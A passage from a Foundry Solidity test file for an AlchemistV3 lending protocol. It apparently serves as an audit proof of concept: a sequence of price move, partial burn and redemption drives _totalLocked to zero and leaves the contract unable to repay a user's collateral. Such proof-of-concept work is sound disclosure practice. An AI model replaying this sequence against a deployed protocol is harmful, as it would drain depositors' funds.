    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    address public user1 = address(0x1111);

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(address(user1));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), address(0xbeef), accountFunds);
        _magicDepositToVault(address(vault), user1, accountFunds);
        _magicDepositToVault(address(vault), address(0xdad), accountFunds);
        _magicDepositToVault(address(vault), externalUser, accountFunds);
        _magicDepositToVault(address(vault), yetAnotherExternalUser, accountFunds);
        _magicDepositToVault(address(vault), anotherExternalUser, accountFunds);
        vm.stopPrank();

        vm.startPrank(address(admin));
        allocator.allocate(address(mytStrategy), vault.convertToAssets(vault.totalSupply()));
        vm.stopPrank();

        deal(address(alToken), address(0xdad), accountFunds);
        deal(address(alToken), address(anotherExternalUser), accountFunds);
        deal(address(vault.asset()), address(0xbeef), accountFunds);
        deal(address(vault.asset()), user1, accountFunds);
        deal(address(vault.asset()), externalUser, accountFunds);
        deal(address(vault.asset()), yetAnotherExternalUser, accountFunds);
        deal(address(vault.asset()), anotherExternalUser, accountFunds);
        deal(address(vault.asset()), alchemist.alchemistFeeVault(), 10_000 * (10 ** alchemistUnderlyingTokenDecimals));

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(vault), someWhale, whaleSupply);
        deal(address(vault.asset()), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(vault.asset()), address(mockStrategyYieldToken), whaleSupply);
        vm.stopPrank();
    }

    function testTotalLocked() external {
        //beef deposits and mints
        uint256 amount = accountFunds/2;
        uint256 ltv_beef = 2e17;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);

        // a single position nft would have been minted to address(0xbeef)
        uint256 tokenId_beef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId_beef, (amount * ltv_beef) / FIXED_POINT_SCALAR, address(0xbeef));
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(address(0xbeef)), (amount * ltv_beef) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        //user1 deposits and mints
        uint256 ltv_user1 = 3e16;
        vm.startPrank(user1);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, user1, 0);

        // a single position nft would have been minted to user1
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(user1, address(alchemistNFT));
        alchemist.mint(tokenId1, (amount * ltv_user1) / FIXED_POINT_SCALAR, user1);
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(user1), (amount * ltv_user1) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = (initialVaultSupply * 7750 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // beef and user1 mint again based on the new price
        vm.startPrank(address(0xbeef));
        alchemist.mint(tokenId_beef, (amount * ltv_beef) / FIXED_POINT_SCALAR, address(0xbeef));
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(address(0xbeef)), (2* amount * ltv_beef) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        vm.startPrank(user1);
        alchemist.mint(tokenId1, (amount * ltv_user1) / FIXED_POINT_SCALAR, user1);
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(user1), (2* amount * ltv_user1) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        (, uint256 userDebt_beef,) = alchemist.getCDP(tokenId_beef);
        uint256 rawlocked_beef = 
            alchemist.convertDebtTokensToYield(userDebt_beef) * minimumCollateralization / FIXED_POINT_SCALAR;
        console.log("raw locked beef after price move:", rawlocked_beef);    

        (, uint256 userDebt_user1,) = alchemist.getCDP(tokenId1);
        uint256 rawlocked_user1 = 
            alchemist.convertDebtTokensToYield(userDebt_user1) * minimumCollateralization / FIXED_POINT_SCALAR;
        console.log("raw locked user1 after price move:", rawlocked_user1);  

        uint256 sumRawLocked = rawlocked_beef + rawlocked_user1;
        console.log("sum of raw locked after price move:", sumRawLocked);

        //check total locked vs sum of raw locked amounts after the price moved
        uint256 tl_afterPriceMove = alchemist._totalLocked();
        console.log("_totalLocked after price move:", tl_afterPriceMove);

        // total locked is not updated properly and drifts away from the sum of the raw locked amounts
        assertGe(sumRawLocked, tl_afterPriceMove);
        assertGe(rawlocked_beef, tl_afterPriceMove);

        vm.roll(block.number + 1);

        //beef burns some amount
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(alToken), address(alchemist), userDebt_beef);
        alchemist.burn(9 * userDebt_beef / 10, tokenId_beef);
        vm.stopPrank();

        //after beef burns part of the debt the total locked becomes zero
        uint256 tl_afterBurn = alchemist._totalLocked();
        console.log("_totalLocked after beef burns part of the debt:", tl_afterBurn);
        assertEq(tl_afterBurn, 0);

        alchemist.poke(tokenId_beef);
        alchemist.poke(tokenId1);

        (uint256 collateral_beef_afterBurn, uint256 userDebt_beef_afterBurn,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after Burn:", collateral_beef_afterBurn);   
        console.log("debt beef after Burn:", userDebt_beef_afterBurn);

        (uint256 collateral_user1_afterBurn, uint256 userDebt_user1_afterBurn,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after Burn:", collateral_user1_afterBurn);   
        console.log("debt user1 after Burn:", userDebt_user1_afterBurn);

        console.log("Alchemist MYT shares:", IERC20(address(vault)).balanceOf(address(alchemist)));
        //the alchemist holds the sum of beef and user1 collateral
        assertEq(IERC20(address(vault)).balanceOf(address(alchemist)), collateral_beef_afterBurn + collateral_user1_afterBurn);

        //dad creates and claims redemption, but becase _totalLocked is zero, 
        //_collateralWeight does not get updated
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 1000e18);
        transmuterLogic.createRedemption(1000e18);
        vm.stopPrank();

        vm.roll(block.number + 5_256_000);

        vm.startPrank(address(0xdad));
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();

        //the alchemist holds less shares after redemption
        //but the beef and user1 collaterals did not get updated
        console.log("Alchemist MYT shares after redemption:", IERC20(address(vault)).balanceOf(address(alchemist)));

        alchemist.poke(tokenId_beef);
        alchemist.poke(tokenId1);

        (uint256 collateral_beef_afterRedemption, uint256 userDebt_beef_afterRedemption,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after redemption:", collateral_beef_afterRedemption);   
        console.log("debt beef after redemption:", userDebt_beef_afterRedemption);
        assertEq(collateral_beef_afterBurn, collateral_beef_afterRedemption);

        (uint256 collateral_user1_afterRedemption, uint256 userDebt_user1_afterRedemption,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after redemption:", collateral_user1_afterRedemption);   
        console.log("debt user1 after redemption:", userDebt_user1_afterRedemption);
        assertEq(collateral_user1_afterBurn, collateral_user1_afterRedemption);

        //beef repays and withdraws all of his collateral
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.repay(amount, tokenId_beef);
        vm.stopPrank();

        alchemist.poke(tokenId_beef);
        (uint256 collateral_beef_afterRepay, uint256 userDebt_beef_afterRepay,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after repay:", collateral_beef_afterRepay);   
        console.log("debt beef after repay:", userDebt_beef_afterRepay);

        uint256 beefBalanceBeforeWithdraw = IERC20(address(vault)).balanceOf(address(0xbeef));

        vm.startPrank(address(0xbeef));
        alchemist.withdraw(collateral_beef_afterRepay, address(0xbeef), tokenId_beef);
        vm.stopPrank();

        alchemist.poke(tokenId_beef);

        uint256 beefBalanceAfterWithdraw = IERC20(address(vault)).balanceOf(address(0xbeef));
        assertEq(beefBalanceAfterWithdraw - beefBalanceBeforeWithdraw, collateral_beef_afterRepay);

        //the alchemist becomes insolvent
        console.log("Alchemist MYT shares after beef withdraws all of his collateral:", IERC20(address(vault)).balanceOf(address(alchemist)));
        
        alchemist.poke(tokenId1);

        //user1 repays all of her debt
        vm.startPrank(user1);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.repay(amount, tokenId1);
        vm.stopPrank();

        alchemist.poke(tokenId1);
        (uint256 collateral_user1_afterRepay, uint256 userDebt_user1_afterRepay,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after repay:", collateral_user1_afterRepay);   
        console.log("debt user1 after repay:", userDebt_user1_afterRepay);

        //user1 tries to withdraw all of her collateral but the alchemist doesn't have enough funds
        vm.startPrank(user1);
        vm.expectRevert(); // expect ERC20CallFailed / panic(0x11)
        alchemist.withdraw(collateral_user1_afterRepay, user1, tokenId1);
        vm.stopPrank();
    } 
}
```
